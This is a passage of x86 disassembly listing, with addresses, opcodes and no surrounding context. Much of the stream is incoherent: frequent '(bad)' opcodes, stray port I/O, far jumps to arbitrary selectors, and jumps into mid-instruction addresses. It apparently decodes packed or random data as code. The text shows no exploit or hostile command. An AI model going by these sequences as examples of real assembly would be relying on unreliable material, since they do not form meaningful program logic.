  4020d5:	pusha  
  4020d6:	lds    edi,FWORD PTR [ebx-0x40]
  4020d9:	sbb    al,0x9d
  4020db:	(bad)  
  4020dc:	pop    ds
  4020dd:	mov    BYTE PTR [edx-0x55],dl
  4020e0:	cli    
  4020e1:	mov    esi,0xabed2344
  4020e6:	sti    
  4020e7:	xor    eax,0xa8a56c1a
  4020ec:	mov    DWORD PTR [ecx+0x7e],edx
  4020ef:	or     al,0x8d
  4020f1:	mov    eax,0x79ae6754
  4020f6:	xor    DWORD PTR [ecx],ebx
  4020f8:	arpl   WORD PTR [edx+ebp*8+0x5b],bx
  4020fc:	dec    ecx
  4020fd:	pop    ebx
  4020fe:	ficom  DWORD PTR [ecx]
  402100:	dec    edx
  402101:	in     eax,0xab
  402103:	jmp    0x402096
  402105:	(bad)  
  402106:	push   ebx
  402107:	mov    ecx,0xf13ac2ee
  40210c:	(bad)  
  40210d:	fidiv  WORD PTR [ebx+0x5e]
  402110:	mul    DWORD PTR [eax]
  402112:	mov    al,BYTE PTR [esi+0x63530807]
  402118:	out    0xa,al
  40211a:	cmp    al,0x2f
  40211c:	xor    eax,0x56eb17ea
  402121:	enter  0x4aef,0x80
  402125:	cdq    
  402126:	adc    eax,0xaba2758f
  40212b:	fisttp DWORD PTR [esi+ebx*4-0x43dc3fd5]
  402132:	pop    edi
  402133:	xor    eax,DWORD PTR [edi+0x51fb4f02]
  402139:	mov    ds:0x4614c4c9,al
  40213e:	arpl   WORD PTR [esi+eax*8+0x5c],sp
  402142:	aas    
  402143:	repz fist WORD PTR [eax+0x22]
  402147:	sbb    cl,BYTE PTR cs:[ebx+eiz*4+0x4cccad66]
  40214f:	pop    esp
  402150:	push   edi
  402151:	and    al,0x71
  402153:	add    al,0x35
  402155:	stos   DWORD PTR es:[edi],eax
  402156:	inc    ebp
  402157:	dec    esi
  402158:	xchg   ecx,eax
  402159:	pop    ds
  40215a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40215b:	cli    
  40215c:	mov    BYTE PTR [edx+0x4e],ah
  40215f:	popa   
  402160:	lods   eax,DWORD PTR ds:[esi]
  402161:	jmp    0xfa4d:0x86fede17
  402168:	loop   0x402108
  40216a:	or     eax,0xfd388a25
  40216f:	in     al,0x5
  402171:	and    BYTE PTR [ebp+0x30],dl
  402174:	outs   dx,BYTE PTR ds:[esi]
  402175:	adc    DWORD PTR [esi+0x23],ecx
  402178:	mov    edi,0xcff22010
  40217d:	aas    
  40217e:	pop    ss
  40217f:	pop    ebx
  402180:	es jae 0x40212b
  402183:	push   esp
  402184:	mov    ds:0x1f5ebb8d,al
  402189:	or     esp,DWORD PTR [edx-0x7b0d1f23]
  40218f:	loop   0x4021ee
  402191:	sbb    cl,ch
  402193:	rol    DWORD PTR [eax-0x7f2b4089],1
  402199:	das    
  40219a:	xchg   ebp,eax
  40219b:	xor    DWORD PTR [ebp-0x3730f3a7],edx
  4021a1:	cmp    al,0x65
  4021a3:	xchg   edi,eax
  4021a4:	and    al,0x68
  4021a6:	inc    edi
  4021a7:	daa    
  4021a8:	inc    ecx
  4021a9:	test   BYTE PTR [esi+0x1a],bh
  4021ac:	leave  
  4021ad:	xchg   edx,eax
  4021ae:	adc    ah,dl
  4021b0:	lods   al,BYTE PTR ds:[esi]
  4021b1:	cwde   
  4021b2:	pop    esi
  4021b3:	xchg   esi,eax
  4021b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021b5:	cld    
  4021b6:	xchg   esp,eax
  4021b7:	loopne 0x40214e
  4021b9:	fdivr  DWORD PTR [ebx-0xf]
  4021bc:	or     al,0x85
  4021be:	or     bl,BYTE PTR [edi+0x7a45808]
  4021c4:	sub    DWORD PTR [edi-0x15],edx
  4021c7:	pop    edi
  4021c8:	pop    ss
  4021c9:	shl    dh,cl
  4021cb:	mov    al,0x9c
  4021cd:	enter  0x5685,0xa2
  4021d1:	and    al,0xe1
  4021d3:	adc    al,al
  4021d5:	(bad)  
  4021d6:	mov    esi,0xc457be88
  4021db:	shr    edx,cl
  4021dd:	mov    ah,0x68
  4021df:	dec    ebx
  4021e0:	in     al,0xa8
  4021e2:	mov    DWORD PTR [ebx+edx*8+0x55],edx
  4021e6:	jmp    0xb1b7:0x8eef0b90
  4021ed:	sub    al,0x38
  4021ef:	dec    edi
  4021f0:	fucom  st(5)
  4021f2:	out    0x97,eax
  4021f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021f5:	inc    edi
  4021f6:	sub    al,0xbc
  4021f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021f9:	inc    ebp
  4021fa:	jge    0x402259
  4021fc:	cmc    
  4021fd:	test   BYTE PTR [eax-0x7d43f41a],ch
  402203:	adc    esi,DWORD PTR [eax-0x5a30a5c8]
  402209:	mov    bh,0x2b
  40220b:	jmp    0x84e0:0x4bc99abc
  402212:	jmp    0x4021b4
  402214:	fs aaa 
  402216:	jmp    0x40221a
  402218:	jns    0x4021c4
  40221a:	xchg   ebp,eax
  40221b:	cli    
  40221c:	rcl    DWORD PTR [ecx-0x3404d54f],0xbb
  402223:	call   0x6d48eb30
  402228:	fcomip st,st(6)
  40222a:	mov    eax,ds:0x75f704ae
  40222f:	pop    ecx
  402230:	add    ah,0x3c
  402233:	cmp    dl,BYTE PTR [edx+0x1c030ca0]
  402239:	push   esp
  40223a:	xor    al,0xb2
  40223c:	pusha  
  40223d:	xchg   BYTE PTR [eax+ebp*1-0x101c5412],dl
  402244:	adc    eax,0xcd291551
  402249:	rcr    esp,0xa8
  40224c:	jne    0x4021ff
  40224e:	aaa    
  40224f:	aam    0xbe
  402251:	fisubr WORD PTR [esp+eax*1-0x6039613d]
  402258:	mov    esi,0xcf39ccd9
  40225d:	push   edi
  40225e:	dec    edx
  40225f:	xchg   esi,eax
  402260:	jae    0x402234
  402262:	test   al,0x1
  402264:	mov    dl,0x4
  402266:	xlat   BYTE PTR fs:[ebx]
  402268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402269:	xor    al,0x92
  40226c:	add    ch,BYTE PTR [ebx+0x6e]
  40226f:	jmp    0x5b2d887b
  402274:	jne    0x4022d7
  402276:	inc    esp
  402277:	inc    eax
  402278:	mov    dh,0xf5
  40227a:	adc    eax,ecx
  40227c:	jb     0x40229e
  40227e:	int    0x47
  402280:	sbb    cl,ah
  402282:	dec    esp
  402283:	jne    0x40221e
  402285:	mov    eax,ds:0xdf288e62
  40228a:	lods   eax,DWORD PTR ds:[esi]
  40228b:	leave  
  40228c:	jae    0x40227b
  40228e:	jg     0x402228
  402290:	sub    eax,DWORD PTR [edx]
  402292:	callw  0xc5a0
  402296:	int3   
  402297:	jns    0x402262
  402299:	inc    ebp
  40229a:	int3   
  40229b:	mov    bl,0x74
  40229d:	sub    DWORD PTR [edx+0x3428e23d],0xc08cc2d9
  4022a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022a8:	rcl    BYTE PTR [ebx+0x74cea764],0x9a
  4022af:	les    edx,FWORD PTR [ebx-0x14]
  4022b2:	addr16 pop es
  4022b4:	sub    bl,ch
  4022b6:	dec    eax
  4022b7:	nop
  4022b8:	ret    0x89a8
  4022bb:	loope  0x40224a
  4022bd:	addr16 jg 0x402293
  4022c0:	push   ebx
  4022c1:	mov    eax,0x9f25a9ec
  4022c6:	iret   
  4022c7:	(bad)  
  4022c8:	inc    edx
  4022c9:	inc    ebp
  4022ca:	fnstsw WORD PTR [edx-0x636d9e9f]
  4022d0:	cld    
  4022d1:	pop    edi
  4022d2:	in     eax,0x5a
  4022d4:	(bad)  
  4022d5:	mov    ecx,DWORD PTR [ebx+0x34014498]
  4022db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022dc:	mov    esi,0x91ebff29
  4022e1:	mov    BYTE PTR [esp+ecx*2],ch
  4022e4:	out    dx,eax
  4022e5:	mov    DWORD PTR ds:0x5b795c36,ecx
  4022eb:	mov    ch,0x1a
  4022ed:	call   0x7cd6:0x1684c46d
  4022f4:	pop    ebx
  4022f5:	in     eax,dx
  4022f6:	in     eax,0x6
  4022f8:	out    dx,al
  4022f9:	xlat   BYTE PTR ds:[ebx]
  4022fa:	adc    ebx,DWORD PTR [ebx+0x35f491a6]
  402300:	push   esp
  402301:	push   ebx
  402302:	cmp    BYTE PTR [ebp-0x5c7abb5f],cl
  402308:	sub    DWORD PTR [edx+0x58baf397],edx
  40230e:	jl     0x4022c2
  402310:	xor    edx,eax
  402312:	inc    ebp
  402313:	pushf  
  402314:	xchg   ebp,eax
  402315:	mov    esi,DWORD PTR [ebx-0x5f]
  402318:	call   0xdfda8a3a
  40231d:	cli    
  40231e:	lock ret 0xbf3c
  402322:	inc    ebx
  402323:	cmc    
  402324:	stos   BYTE PTR es:[edi],al
  402325:	and    eax,0x5c215974
  40232a:	dec    edx
  40232b:	xchg   ebx,eax
  40232c:	lahf   
  40232d:	je     0x402359
  40232f:	out    0xe5,eax
  402331:	mov    al,ds:0x65417ba8
  402336:	mov    al,ds:0x1af8b24a
  40233b:	sahf   
  40233c:	mov    eax,ds:0x7f728c86
  402341:	mov    al,0x96
  402343:	test   eax,0x88b4f0ea
  402348:	and    eax,0x200694ab
  40234d:	loope  0x4022f8
  40234f:	xor    al,0x8c
  402351:	mov    al,0x3a
  402353:	mul    DWORD PTR [esi+eiz*4-0x5b]
  402357:	and    BYTE PTR [ebx-0x2544f66a],ch
  40235d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40235e:	mov    ch,0x95
  402360:	loopne 0x402307
  402362:	out    0xee,al
  402364:	imul   ebp,DWORD PTR [ebp-0x2b55a2e0],0xffffffea
  40236b:	nop
  40236c:	shl    DWORD PTR es:[esi+ebp*1-0x42d2337c],cl
  402374:	push   ds
  402375:	sbb    ah,BYTE PTR [edi+0x4b6f6bb]
  40237b:	or     edx,DWORD PTR [ebp-0x14]
  40237e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40237f:	fiadd  WORD PTR [ecx-0x30]
  402382:	div    DWORD PTR [edi]
  402384:	jg     0x4023b0
  402386:	lock ja 0x4023aa
  402389:	ror    BYTE PTR [ebx+eax*4-0x38],0xd2
  40238e:	pop    ss
  40238f:	pusha  
  402390:	and    bh,BYTE PTR [edx+ebp*1]
  402393:	rcr    cl,cl
  402395:	imul   ebp,DWORD PTR [ebx-0x7b],0xeaf5349b
  40239c:	dec    ecx
  40239d:	imul   ebp,DWORD PTR [eax+0x5443ebb7],0x62a191bd
  4023a7:	or     bp,di
  4023aa:	mov    edx,0xda25ca89
  4023af:	neg    DWORD PTR [ecx]
  4023b1:	loopne 0x4023d4
  4023b3:	pop    es
  4023b4:	jge    0x4023f7
  4023b6:	xor    al,0xd7
  4023b8:	fdiv   st,st(7)
  4023ba:	mov    bl,0x62
  4023bc:	popa   
  4023bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4023be:	inc    ebp
  4023bf:	dec    eax
  4023c0:	push   0xffffff99
  4023c2:	pop    ecx
  4023c3:	dec    ebp
  4023c4:	or     eax,0x83cdea12
  4023c9:	stos   BYTE PTR es:[edi],al
  4023ca:	lods   al,BYTE PTR ds:[esi]
  4023cb:	dec    ebx
  4023cc:	int3   
  4023cd:	or     eax,0x32c083e1
  4023d2:	xor    eax,0xf50221d5
  4023d7:	iret   
  4023d8:	ja     0x40236f
  4023da:	lea    esp,[eax]
  4023dc:	leave  
  4023dd:	sbb    ah,BYTE PTR [edi]
  4023df:	mov    esp,0x8ebb47ca
  4023e4:	adc    DWORD PTR ds:0x4add56a3,0xffffff82
  4023eb:	jne    0x4023d6
  4023ed:	icebp  
  4023ee:	and    BYTE PTR [ecx-0x54],cl
  4023f1:	scas   al,BYTE PTR es:[edi]
  4023f2:	xchg   edx,eax
  4023f3:	ins    BYTE PTR es:[edi],dx
  4023f4:	mov    edi,0xc187675b
  4023f9:	xor    al,0xde
  4023fb:	sub    DWORD PTR [ecx-0x2a61d1b4],0xffffffcc
  402402:	adc    eax,0xe986b457
  402407:	icebp  
  402408:	jmp    0xb33d:0x2322b0f2
  40240f:	push   edi
  402410:	mov    cs,WORD PTR [edi-0x69d54d61]
  402416:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402417:	outs   dx,DWORD PTR ds:[esi]
  402418:	mov    al,0x5c
  40241a:	mov    bh,0x84
  40241c:	rcl    BYTE PTR [ecx+esi*4],1
  40241f:	jno    0x402452
  402421:	ja     0x40247b
  402423:	es jl  0x402409
  402426:	mov    ah,0x1a
  402428:	push   cs
  402429:	xlat   BYTE PTR ds:[ebx]
  40242a:	mov    al,ds:0x74ab6da6
  40242f:	fidivr WORD PTR [eax]
  402431:	and    esp,DWORD PTR [edx-0x5d6cd719]
  402437:	das    
  402438:	mov    edi,0xe470eff
  40243d:	fwait
  40243e:	inc    ebx
  40243f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402440:	mov    al,0x75
  402442:	sbb    DWORD PTR [ebx+0x74],ecx
  402445:	lods   al,BYTE PTR ds:[esi]
  402446:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402447:	leave  
  402448:	push   esi
  402449:	xor    BYTE PTR ds:0x5f1d83b2,ch
  40244f:	ret    0xef8d
  402452:	mov    cl,0xb9
  402454:	inc    esi
  402455:	pop    ss
  402456:	daa    
  402457:	aas    
  402458:	and    ebx,esp
  40245a:	fucom  st(0)
  40245c:	frstor [edi+0x2e]
  40245f:	sti    
  402460:	mov    dl,0x63
  402462:	add    BYTE PTR [esi-0x62],dl
  402465:	in     eax,dx
  402466:	nop
  402467:	retf   0x70d7
  40246a:	call   0x834e8a19
  40246f:	jae    0x40247a
  402471:	mov    al,0x14
  402473:	xor    BYTE PTR [edx+0x10dfb751],bh
  402479:	add    BYTE PTR [ebp-0x5c],ch
  40247c:	lods   eax,DWORD PTR ds:[esi]
  40247d:	shr    BYTE PTR [ebx],1
  40247f:	push   ds
  402480:	jp     0x402474
  402482:	in     al,0x10
  402484:	in     al,0xd3
  402486:	adc    bl,BYTE PTR [ebx+0x64d2a44a]
  40248c:	nop
  40248d:	aaa    
  40248e:	mov    DWORD PTR [ebp-0xe8decc6],0x27211d15
  402498:	icebp  
  402499:	mov    cl,0x38
  40249b:	popa   
  40249c:	in     eax,0x60
  40249e:	mov    ah,0xab
  4024a0:	sbb    BYTE PTR [ecx+0x53e6cb5c],0x82
  4024a7:	popa   
  4024a8:	lock or eax,0x85cbd7ba
  4024ae:	shr    DWORD PTR [edi],0x91
  4024b1:	xor    DWORD PTR ds:0xae628d6e,edx
  4024b7:	pop    es
  4024b8:	popf   
  4024b9:	xchg   edi,eax
  4024ba:	test   al,0x1f
  4024bc:	xor    BYTE PTR [ebx],ah
  4024be:	ficom  WORD PTR ds:0xe8ef2173
  4024c4:	push   es
  4024c5:	xchg   esi,eax
  4024c6:	sbb    DWORD PTR [eax+0x6f6a80a8],0x2a5170eb
  4024d0:	pop    ss
  4024d1:	lods   eax,DWORD PTR ds:[esi]
  4024d2:	out    dx,al
  4024d3:	(bad)  
  4024d4:	push   esi
  4024d5:	scas   eax,DWORD PTR es:[edi]
  4024d6:	mov    dl,0xda
  4024d8:	xchg   BYTE PTR ds:0xf6de5c83,ah
  4024de:	test   al,0x33
  4024e0:	fsubrp st(3),st
  4024e2:	in     eax,0xa8
  4024e4:	test   al,0xc0
  4024e6:	in     al,dx
  4024e7:	mov    WORD PTR [eax+0x3566acc6],?
  4024ed:	in     eax,dx
  4024ee:	lahf   
  4024ef:	and    BYTE PTR [esi+0x60ddb88],cl
  4024f5:	lock jg 0x4024eb
  4024f8:	add    DWORD PTR ds:0x82d42e38,edi
  4024fe:	dec    ebx
  4024ff:	or     al,0x3a
  402501:	stc    
  402502:	int3   
  402503:	das    
  402504:	push   ebp
  402505:	jle    0x40255e
  402507:	sub    BYTE PTR [ebx],al
  402509:	mov    esi,DWORD PTR [edx]
  40250b:	adc    ebx,DWORD PTR [eax-0xe]
  40250e:	inc    ebp
  40250f:	fisub  DWORD PTR [edx+0x54]
  402512:	fisubr DWORD PTR [esi]
  402514:	(bad)  
  402515:	(bad)  
  402516:	in     al,dx
  402517:	and    DWORD PTR [edi-0xd3e83c2],ebp
  40251d:	fisub  WORD PTR [ebx+0x48bb17ae]
  402523:	mov    ah,0xc
  402525:	add    BYTE PTR [esi+0x6bd9d936],ch
  40252b:	and    DWORD PTR [ebp+0x14cc3c4b],ebx
  402531:	push   DWORD PTR [eax+ebx*2]
  402534:	mov    ebp,0x68aa77a8
  402539:	aad    0x7b
  40253b:	fcmove st,st(6)
  40253d:	jo     0x40252e
  40253f:	sub    ebp,ecx
  402541:	push   ds
  402542:	xor    edx,DWORD PTR [ecx-0x4]
  402545:	dec    ebx
  402546:	mov    eax,ds:0xbe596ce3
  40254b:	push   es
  40254c:	scas   eax,DWORD PTR es:[edi]
  40254d:	call   0x7137:0xe0c4034e
  402554:	pop    edi
  402555:	leave  
  402556:	cmp    edi,edi
  402558:	mov    ah,0x2e
  40255a:	mov    dl,0xdd
  40255c:	cli    
  40255d:	mov    dl,0xa7
  40255f:	imul   BYTE PTR [ebx-0x690bacf8]
  402565:	lds    ebp,FWORD PTR [ecx+edi*8-0x30]
  402569:	pop    ecx
  40256a:	test   DWORD PTR [edi-0x31de7b9d],ecx
  402570:	(bad)  
  402571:	adc    al,0x72
  402573:	xor    eax,0xd4c3bc6f
  402578:	mov    dh,0x85
  40257a:	xor    al,0x48
  40257c:	cmp    eax,0x3a36a7ff
  402581:	sbb    BYTE PTR [ebx],al
  402583:	fwait
  402584:	pop    es
  402585:	aas    
  402586:	xchg   ecx,eax
  402587:	lahf   
  402588:	cld    
  402589:	jns    0x4025bf
  40258b:	aaa    
  40258c:	into   
  40258d:	cld    
  40258e:	adc    BYTE PTR [ecx],0x96
  402591:	mov    ecx,0xa5accf67
  402596:	jle    0x402557
  402598:	out    dx,al
  402599:	aad    0x68
  40259b:	sahf   
  40259c:	mov    ds:0x42586f6d,al
  4025a1:	or     ch,BYTE PTR [eax+0x1d]
  4025a4:	dec    esp
  4025a5:	push   es
  4025a6:	sub    DWORD PTR [edx-0x37032dc],0xffffff98
  4025ad:	das    
  4025ae:	jbe    0x402530
  4025b0:	mov    dh,0x6b
  4025b2:	cmp    eax,0x3189208e
  4025b7:	sti    
  4025b8:	push   ds
  4025b9:	neg    BYTE PTR [ebp-0x1c]
  4025bc:	xchg   esp,eax
  4025bd:	xor    ch,BYTE PTR [ebx+ebx*8+0x2f9a555c]
  4025c4:	mov    edx,0x47d656fa
  4025c9:	adc    BYTE PTR [edi-0x1dd5c056],dh
  4025cf:	adc    BYTE PTR [edx],ah
  4025d1:	add    dh,BYTE PTR [eax+0x16]
  4025d4:	cli    
  4025d5:	xor    BYTE PTR [ecx-0x5bc3543b],bh
  4025db:	popa   
  4025dc:	xlat   BYTE PTR ds:[ebx]
  4025dd:	sub    eax,0xbd51589e
  4025e2:	ficomp DWORD PTR [ebp-0x57ff226b]
  4025e8:	mov    esi,0x533ec960
  4025ed:	sub    ch,ch
  4025ef:	call   0xc789:0xc91bcf0d
  4025f6:	adc    BYTE PTR [ebx-0x43],ah
  4025f9:	xor    DWORD PTR [ebx],edx
  4025fb:	mov    dh,0x44
  4025fd:	and    DWORD PTR [eax-0x568947a3],ebx
  402603:	mov    ah,0x89
  402605:	cdq    
  402606:	sub    al,0x42
  402608:	mov    ah,0x11
  40260a:	push   ss
  40260b:	push   es
  40260c:	cwde   
  40260d:	enter  0x146f,0xaa
  402611:	cdq    
  402612:	lahf   
  402613:	and    ebp,eax
  402615:	xchg   ebx,eax
  402616:	xor    BYTE PTR [edi+0x61],dl
  402619:	jae    0x40260b
  40261b:	inc    ebx
  40261c:	and    ch,cl
  40261e:	rcl    DWORD PTR [ebx-0x722cb7c9],1
  402624:	aas    
  402625:	rcr    BYTE PTR [ebx],0xe0
  402628:	or     ebp,DWORD PTR [edx+0x151e5ba0]
  40262e:	sbb    eax,0xfee121cb
  402633:	(bad)  
  402634:	pusha  
  402635:	pop    ebx
  402636:	jmp    0xafc8144e
  40263b:	fucom  st(6)
  40263d:	ins    BYTE PTR es:[edi],dx
  40263e:	xchg   DWORD PTR [eax+0x55b6e57b],esi
  402644:	sahf   
  402645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402646:	outs   dx,BYTE PTR ds:[esi]
  402647:	sbb    al,0x14
  402649:	inc    eax
  40264a:	js     0x402684
  40264c:	test   DWORD PTR [ecx-0x20],edx
  40264f:	jnp    0x40262e
  402651:	int3   
  402652:	aad    0x94
  402654:	add    ebp,esi
  402656:	jge    0x4025ed
  402658:	add    DWORD PTR [esi+0x76],esi
  40265b:	cdq    
  40265c:	push   eax
  40265d:	stos   BYTE PTR es:[di],al
  40265f:	or     eax,0x68c46bab
  402664:	(bad)  
  402665:	and    dh,bh
  402667:	ficomp DWORD PTR [eax+0x29c4c52]
  40266d:	or     bl,al
  40266f:	add    DWORD PTR [eax-0xd67c6fe],0x8db26457
  402679:	rcl    esp,1
  40267b:	and    al,0xf4
  40267d:	mov    eax,0x2f41856f
  402682:	rep outs dx,BYTE PTR ds:[esi]
  402684:	dec    ecx
  402685:	pop    ds
  402686:	or     ebp,DWORD PTR [edx+0x381e0c39]
  40268c:	(bad)
  402690:	sub    DWORD PTR ds:[edi-0x342e497b],0x8ffa1dc
  40269b:	add    ah,BYTE PTR [eax-0x537cdf9]
  4026a1:	xchg   esp,eax
  4026a2:	xchg   edi,eax
  4026a3:	or     al,0x4c
  4026a5:	mov    WORD PTR [esi-0x212c19e8],cs
  4026ab:	ins    BYTE PTR es:[edi],dx
  4026ac:	pop    ebp
  4026ad:	inc    bl
  4026af:	add    DWORD PTR [ebx-0x5d],esi
  4026b2:	pop    ds
  4026b3:	shr    BYTE PTR [edi],0xd
  4026b6:	ss in  eax,0x13
  4026b9:	leave  
  4026ba:	jmp    0x402716
  4026bc:	iret   
  4026bd:	dec    ecx
  4026be:	fwait
  4026bf:	test   ah,dl
  4026c1:	addr16 int 0xa1
  4026c4:	retf   
  4026c5:	push   esp
  4026c6:	jnp    0x4026a2
  4026c8:	fidiv  DWORD PTR [ecx-0x10de94b5]
  4026ce:	std    
  4026cf:	cmp    esi,ecx
  4026d1:	clc    
  4026d2:	dec    ecx
  4026d3:	inc    esi
  4026d4:	cmp    ebp,DWORD PTR [ebx-0x80]
  4026d7:	xchg   edx,eax
  4026d8:	and    al,0x4
  4026da:	sbb    dl,BYTE PTR [ebx-0x26]
  4026dd:	xchg   edi,eax
  4026de:	push   0xffffff80
  4026e0:	mov    al,ds:0xed7c6709
  4026e5:	sub    ecx,DWORD PTR [ecx+0x56]
  4026e8:	(bad)  
  4026e9:	call   0x3c2b1520
  4026ee:	gs sbb dl,dh
  4026f1:	icebp  
  4026f2:	jmp    0x3a28:0xeda84ec1
  4026f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4026fa:	adc    DWORD PTR [edi-0x23],esp
  4026fd:	pop    es
  4026fe:	sbb    edx,DWORD PTR [edi]
  402700:	jne    0x40276c
  402702:	in     eax,0x79
  402704:	mov    bl,0x2d
  402706:	or     al,BYTE PTR [edx-0x1d]
  402709:	cmp    BYTE PTR [ebx-0xa44dda],0x30
  402710:	in     eax,dx
  402711:	imul   edx,esi,0x6255c18a
  402717:	xlat   BYTE PTR gs:[ebx]
  402719:	push   edx
  40271a:	jnp    0x402765
  40271c:	and    al,0x7b
  40271e:	xor    cl,BYTE PTR [eax]
  402720:	and    ebp,DWORD PTR [esi+0x6b]
  402723:	imul   BYTE PTR [esi+0x0]
  402726:	gs pop eax
  402728:	or     BYTE PTR [ebp-0x1551fe5c],0x5c
  40272f:	in     al,0xe8
  402731:	jo     0x402719
  402733:	push   0xffffffd0
  402735:	xchg   esp,eax
  402736:	shl    DWORD PTR [ecx+esi*1-0x4c],1
  40273a:	push   ebp
  40273b:	add    BYTE PTR [edi-0x6e],al
  40273e:	sti    
  40273f:	push   ebx
  402740:	xor    bl,BYTE PTR [edx+0x606fc2a7]
  402746:	js     0x402723
  402748:	repz das 
  40274a:	pop    esp
  40274b:	outs   dx,BYTE PTR ds:[esi]
  40274c:	jge    0x4027c3
  40274e:	adc    eax,0x43c2b59b
  402753:	xor    DWORD PTR [ecx-0x15],ecx
  402756:	mov    eax,0x9227dc7b
  40275b:	pop    ebp
  40275c:	push   edx
  40275d:	dec    eax
  40275e:	or     eax,0x4b9b2e01
  402763:	outs   dx,BYTE PTR ds:[esi]
  402764:	add    al,0xaf
  402766:	push   esp
  402767:	inc    eax
  402768:	push   esi
  402769:	je     0x402721
  40276b:	inc    edi
  40276c:	idiv   BYTE PTR [ecx-0x67]
  40276f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402770:	sar    BYTE PTR [ecx-0x24d872ae],1
  402776:	ficom  WORD PTR [eax-0x28]
  402779:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40277a:	adc    eax,0x1d56a56d
  40277f:	ret    0x964d
  402782:	add    DWORD PTR [esi],ebp
  402784:	retf   
  402785:	jmp    0x664f:0x4c775b63
  40278c:	inc    edi
  40278d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40278e:	xchg   edi,eax
  40278f:	add    al,0x56
  402791:	and    ah,BYTE PTR [edi-0x73]
  402794:	call   0x6bd322bc
  402799:	test   DWORD PTR [edx-0xe],eax
  40279c:	test   BYTE PTR [esi+0x63976c8e],0x28
  4027a3:	push   ecx
  4027a4:	mov    cl,0x66
  4027a6:	cmp    bl,dh
  4027a8:	jb     0x4027e0
  4027aa:	cld    
  4027ab:	mov    edx,0xb4f702dc
  4027b0:	les    eax,FWORD PTR [ebp+0x61]
  4027b3:	nop
  4027b4:	call   0x40461f70
  4027b9:	pop    esi
  4027ba:	push   ecx
  4027bb:	sub    BYTE PTR [ebp-0x3e],0x8b
  4027bf:	inc    eax
  4027c0:	fst    DWORD PTR [ecx-0x7ae0d473]
  4027c6:	dec    edi
  4027c7:	inc    edx
  4027c8:	mov    cl,0x1b
  4027ca:	outs   dx,DWORD PTR ds:[esi]
  4027cb:	ja     0x402799
  4027cd:	mov    al,ds:0xf9da4529
  4027d2:	retf   0xe390
  4027d5:	ins    DWORD PTR es:[edi],dx
  4027d6:	cli    
  4027d7:	adc    edx,edi
  4027d9:	cmp    al,0xa6
  4027db:	lods   al,BYTE PTR ds:[esi]
  4027dc:	out    0x47,al
  4027de:	or     eax,0x648d7f30
  4027e3:	jp     0x40279e
  4027e5:	jmp    0x9488:0x7b2a0d68
  4027ec:	jmp    0x4027cc
  4027ee:	xchg   esi,eax
  4027ef:	mov    edx,0x1f0c6a1f
  4027f4:	push   esi
  4027f5:	pop    edi
  4027f6:	mov    ds:0xda52880e,al
  4027fb:	mov    ebp,0x7cb2a56b
  402800:	pop    ecx
  402801:	pusha  
  402802:	pop    ebx
  402803:	add    dh,bh
  402805:	mov    cl,BYTE PTR [edi+0x328cd9c7]
  40280b:	iret   
  40280c:	retf   
  40280d:	sbb    al,0x70
  40280f:	in     al,0xad
  402811:	mov    ecx,0xf362f8c6
  402816:	add    DWORD PTR [edx-0x3048b0b5],0x255a3d10
  402820:	dec    edi
  402821:	test   DWORD PTR [ecx+ebx*1],esi
  402824:	stos   DWORD PTR es:[edi],eax
  402825:	fistp  DWORD PTR [ebp+0x4c]
  402828:	push   edi
  402829:	dec    ebp
  40282a:	test   eax,0x466d75e6
  40282f:	jg     0x4027bc
  402831:	cmp    BYTE PTR [ecx+edx*1],ah
  402834:	push   ds
  402835:	or     BYTE PTR [ebp-0x6b],dh
  402838:	test   al,0xcb
  40283a:	mov    ebx,esp
  40283c:	(bad)  
  40283d:	xor    BYTE PTR [ebx-0x3f],ch
  402840:	(bad)  
  402842:	in     al,dx
  402843:	jne    0x402815
  402845:	add    DWORD PTR [ebx+0x28eeed3c],0xfffffffc
  40284c:	lock push ecx
  40284e:	js     0x402819
  402850:	push   esp
  402851:	fidivr WORD PTR [ebx]
  402853:	add    cl,bh
  402855:	lock sti 
  402857:	lods   al,BYTE PTR ds:[esi]
  402858:	mov    ecx,0xa4296c00
  40285d:	dec    edi
  40285e:	add    eax,0xab56c589
  402863:	mov    edi,ss
  402865:	mov    bl,BYTE PTR [ebx-0x44265350]
  40286b:	add    esp,ebp
  40286d:	int3   
  40286e:	lods   eax,DWORD PTR ds:[esi]
  40286f:	xor    esi,DWORD PTR [ebp-0x33]
  402872:	sbb    al,0x7a
  402874:	jmp    0x402815
  402876:	cld    
  402877:	lds    ebp,FWORD PTR [eax]
  402879:	ins    DWORD PTR es:[edi],dx
  40287a:	xor    edi,DWORD PTR [ebp+0x4d]
  40287d:	sbb    bh,bl
  40287f:	mov    edi,0xd5cd79a5
  402884:	scas   eax,DWORD PTR es:[edi]
  402885:	imul   esi,edx,0x60
  402888:	ror    BYTE PTR [esi],0xd1
  40288b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40288c:	ds (bad) 
  40288e:	cmp    al,0xa9
  402890:	jbe    0x402833
  402892:	mov    WORD PTR [ebx],gs
  402894:	cmp    DWORD PTR [esi+0x505a29d0],esi
  40289a:	inc    ebx
  40289b:	repnz dec eax
  40289d:	(bad)  
  40289e:	jg     0x40290a
  4028a0:	mov    esi,0x96d60e3
  4028a5:	mov    eax,0x30313d94
  4028aa:	scas   al,BYTE PTR es:[edi]
  4028ab:	push   esi
  4028ac:	inc    ebp
  4028ad:	pop    ebp
  4028ae:	mov    dl,0xfc
  4028b0:	or     eax,0x1135f62
  4028b5:	test   BYTE PTR [ebx],bl
